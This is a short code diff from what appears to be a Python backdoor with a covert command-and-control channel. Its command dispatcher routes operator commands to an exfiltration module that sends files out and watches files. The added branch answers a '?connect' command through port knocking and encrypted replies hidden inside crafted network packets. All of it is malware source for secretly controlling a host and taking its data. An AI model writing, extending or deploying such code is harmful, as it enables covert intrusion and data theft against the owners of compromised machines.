@@ -74,6 +74,11 @@ def executeCommand(srcAddress, pacType, command):
 		exfil.removeWatch(command[7:])
 	elif "?file " in command:
 		exfil.sendFile(command[6:])
+	elif "?connect" in command:
+		knockCode(srcAddress, pacType, True)
+		for c in utils.encryptData("Connected"):
+			send(utils.covertPacket(srcAddress, pacType, c, pswd), verbose=0)
+		knockCode(srcAddress, pacType, False)
 	else:
 		sendThread = threading.Thread(target=sendResults, args=(srcAddress,pacType,command))
 		sendThread.start()
